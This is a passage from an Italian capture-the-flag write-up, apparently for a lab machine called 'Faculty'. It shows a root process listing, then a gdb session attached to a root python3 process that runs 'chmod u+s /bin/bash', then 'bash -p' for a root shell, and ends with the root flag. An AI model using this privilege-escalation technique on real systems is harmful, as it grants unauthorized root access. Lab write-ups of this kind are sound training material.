root         734  0.0  0.3  17472  7612 ?        Ss   16:34   0:00 /lib/systemd/systemd-logind
root         736  0.0  0.6 395392 13456 ?        Ssl  16:34   0:00 /usr/lib/udisks2/udisksd
root         755  0.0  0.6 318816 13468 ?        Ssl  16:34   0:00 /usr/sbin/ModemManager
root         912  0.0  0.1   5568  3004 ?        Ss   16:35   0:00 /usr/sbin/cron -f
root         913  0.0  1.0 194680 20220 ?        Ss   16:35   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         915  0.0  0.1   7248  3280 ?        S    16:35   0:00 /usr/sbin/CRON -f
root         922  0.0  0.0   2608   532 ?        Ss   16:35   0:00 /bin/sh -c bash /root/service_check.sh           
root         924  0.0  0.1   5648  3248 ?        S    16:35   0:00 bash /root/service_check.sh
root         940  0.0  0.0  55276  1540 ?        Ss   16:35   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root         953  0.0  0.3  12172  7300 ?        Ss   16:35   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         965  0.0  0.0   2860  1824 tty1     Ss+  16:35   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1562  0.0  0.2  38072  4644 ?        Ss   16:35   0:00 /usr/lib/postfix/sbin/master -w
root        4799  0.0  0.4  13796  8860 ?        Ss   17:58   0:00 sshd: developer [priv]
root        5003  0.0  0.0      0     0 ?        I    18:00   0:00 [kworker/0:2-events]
root        5258  0.0  0.0      0     0 ?        I    18:05   0:00 [kworker/1:0-events]
root       31084  0.0  0.0      0     0 ?        I    18:07   0:00 [kworker/0:1-events]
root       36304  0.0  0.0      0     0 ?        I    18:13   0:00 [kworker/1:2-events]
root       36507  0.0  0.0      0     0 ?        I    18:16   0:00 [kworker/u256:1-events_unbound]
root       36868  0.0  0.0      0     0 ?        I    18:27   0:00 [kworker/u256:2-events_unbound]
root       37096  0.0  0.0   4260   576 ?        S    18:35   0:00 sleep 20
```

Non sapendo quale dei processi fosse corretto si è fatto un "bruteforce" fino a quando non si è trovato quello corretto (python3)

```shell
developer@faculty:/tmp$ gdb -p 720
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.                                                                                                                                                                                            
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 720
Reading symbols from /usr/bin/python3.8...
(No debugging symbols found in /usr/bin/python3.8)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug...
Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
Reading symbols from /usr/lib/debug/.build-id/7b/4536f41cdaa5888408e82d0836e33dcf436466.debug...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
Reading symbols from /usr/lib/debug/.build-id/c0/f40155b3f8bf8c494fa800f9ab197ebe20ed6e.debug...
Reading symbols from /lib/x86_64-linux-gnu/libutil.so.1...
Reading symbols from /usr/lib/debug/.build-id/4f/3ee75c38f09d6346de1e8eca0f8d8a41071d9f.debug...
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...
Reading symbols from /usr/lib/debug/.build-id/fe/91b4090ea04c1559ff71dd9290062776618891.debug...
Reading symbols from /lib/x86_64-linux-gnu/libexpat.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libexpat.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libz.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libz.so.1)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
Reading symbols from /lib/x86_64-linux-gnu/libnss_files.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/da81f0ac3660e3c3cb947c6244151d879ed9e8.debug...
Reading symbols from /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libglib-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libglib-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgobject-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgobject-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgirepository-1.0.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgirepository-1.0.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libffi.so.7...
(No debugging symbols found in /lib/x86_64-linux-gnu/libffi.so.7)
Reading symbols from /lib/x86_64-linux-gnu/libpcre.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libgmodule-2.0.so.0...
--Type <RET> for more, q to quit, c to continue without paging--c
(No debugging symbols found in /lib/x86_64-linux-gnu/libgmodule-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgio-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgio-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libmount.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libmount.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libselinux.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libselinux.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libresolv.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/19041bde5b859c55798ac0745b0b6199cb7d94.debug...
Reading symbols from /lib/x86_64-linux-gnu/libblkid.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libblkid.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libpcre2-8.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre2-8.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libdbus-1.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libdbus-1.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libsystemd.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libsystemd.so.0)
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
Reading symbols from /usr/lib/debug/.build-id/ce/016c975d94bc4770ed8c62d45dea6b71405a2c.debug...
Reading symbols from /lib/x86_64-linux-gnu/liblzma.so.5...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblzma.so.5)
Reading symbols from /lib/x86_64-linux-gnu/liblz4.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblz4.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libgcrypt.so.20...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgcrypt.so.20)
Reading symbols from /lib/x86_64-linux-gnu/libgpg-error.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgpg-error.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)
Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
0x00007f357bd87967 in __GI___poll (fds=0xe8fa90, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 37319]
(gdb) quit
A debugging session is active.

        Inferior 1 [process 720] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/python3.8, process 720
[Inferior 1 (process 720) detached]
```

Con `bash -p` abbiamo la shell da root

```shell
developer@faculty:/tmp$ bash -p
bash-5.0#
```

Abbiamo quindi la root flag: `507ca7dabddfb610f476014f646f833a`